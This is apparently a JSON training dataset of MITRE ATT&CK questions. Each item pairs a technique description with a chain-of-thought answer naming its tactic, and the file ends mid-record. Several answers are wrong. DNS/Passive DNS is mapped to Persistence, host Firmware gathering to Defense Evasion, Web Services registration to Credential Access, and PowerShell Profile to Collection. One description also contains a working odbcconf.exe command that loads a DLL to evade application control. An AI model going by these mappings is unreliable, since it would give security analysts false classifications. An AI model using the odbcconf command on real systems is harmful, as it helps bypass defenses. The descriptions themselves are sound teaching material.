    "instruction": "Which tactic is related to the following description:\nAdversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",
    "context": "",
    "output": "The given description is related to sub technique: Digital Certificates (T1587.003);\nSub technique Digital Certificates (T1587.003) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",
      "answer": "The given description is related to sub technique: Digital Certificates (T1587.003);\nSub technique Digital Certificates (T1587.003) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space).",
    "context": "",
    "output": "The given description is related to sub technique: Disable Crypto Hardware (T1600.002);\nSub technique Disable Crypto Hardware (T1600.002) is a type of technique Weaken Encryption (T1600);\nTechnique Weaken Encryption (T1600) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space).",
      "answer": "The given description is related to sub technique: Disable Crypto Hardware (T1600.002);\nSub technique Disable Crypto Hardware (T1600.002) is a type of technique Weaken Encryption (T1600);\nTechnique Weaken Encryption (T1600) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.\n\nTo help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.",
    "context": "",
    "output": "The given description is related to sub technique SEO Poisoning (T1608.006);\nSub technique SEO Poisoning (T1608.006) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.\n\nTo help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.",
      "answer": "The given description is related to sub technique SEO Poisoning (T1608.006);\nSub technique SEO Poisoning (T1608.006) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).?",
    "context": "",
    "output": "The given description is related to sub technique Install Digital Certificate (T1608.003);\nSub technique Install Digital Certificate (T1608.003) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).",
      "answer": "The given description is related to sub technique Install Digital Certificate (T1608.003);\nSub technique Install Digital Certificate (T1608.003) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.?",
    "context": "",
    "output": "The given description is related to sub technique: Exfiltration to Cloud Storage (T1567.002);\nSub technique Exfiltration to Cloud Storage (T1567.002) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
      "answer": "The given description is related to sub technique: Exfiltration to Cloud Storage (T1567.002);\nSub technique Exfiltration to Cloud Storage (T1567.002) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>).?",
    "context": "",
    "output": "The given description is related to sub technique: Odbcconf (T1218.008);\nSub technique Odbcconf (T1218.008) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>).",
      "answer": "The given description is related to sub technique: Odbcconf (T1218.008);\nSub technique Odbcconf (T1218.008) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
    "context": "",
    "output": "The given description is related to sub technique: DNS/Passive DNS (T1596.001);\nSub technique DNS/Passive DNS (T1596.001) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
      "answer": "The given description is related to sub technique: DNS/Passive DNS (T1596.001);\nSub technique DNS/Passive DNS (T1596.001) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or Exploit Public-Facing Application).?",
    "context": "",
    "output": "The given description is related to sub technique Firmware (T1592.003);\nSub technique Firmware (T1592.003) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or Exploit Public-Facing Application).",
      "answer": "The given description is related to sub technique Firmware (T1592.003);\nSub technique Firmware (T1592.003) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS). Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).",
    "context": "",
    "output": "The given description is related to sub technique: Domain Properties (T1590.001);\nSub technique Domain Properties (T1590.001) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS). Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).",
      "answer": "The given description is related to sub technique: Domain Properties (T1590.001);\nSub technique Domain Properties (T1590.001) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with Digital Certificates to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.",
    "context": "",
    "output": "The given description is related to sub technique DNS Server (T1584.002);\nSub technique DNS Server (T1584.002) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with Digital Certificates to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.",
      "answer": "The given description is related to sub technique DNS Server (T1584.002);\nSub technique DNS Server (T1584.002) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may register for web services\u00a0that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
    "context": "",
    "output": "The given description is related to sub technique Web Services (T1583.006);\nSub technique Web Services (T1583.006) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may register for web services\u00a0that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
      "answer": "The given description is related to sub technique Web Services (T1583.006);\nSub technique Web Services (T1583.006) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.",
    "context": "",
    "output": "The given description is related to sub technique Link Target (T1608.005);\nSub technique Link Target (T1608.005) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.",
      "answer": "The given description is related to sub technique Link Target (T1608.005);\nSub technique Link Target (T1608.005) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. \n\nAdversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. \n\nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.?",
    "context": "",
    "output": "The given description is related to sub technique: Embedded Payloads (T1027.009);\nSub technique Embedded Payloads (T1027.009) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. \n\nAdversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. \n\nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.",
      "answer": "The given description is related to sub technique: Embedded Payloads (T1027.009);\nSub technique Embedded Payloads (T1027.009) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\n\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.  \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched.  \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.?",
    "context": "",
    "output": "The given description is related to sub technique: PowerShell Profile (T1546.013);\nSub technique PowerShell Profile (T1546.013) is a type of technique Event Triggered Execution (T1546);\nTechnique Event Triggered Execution (T1546) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
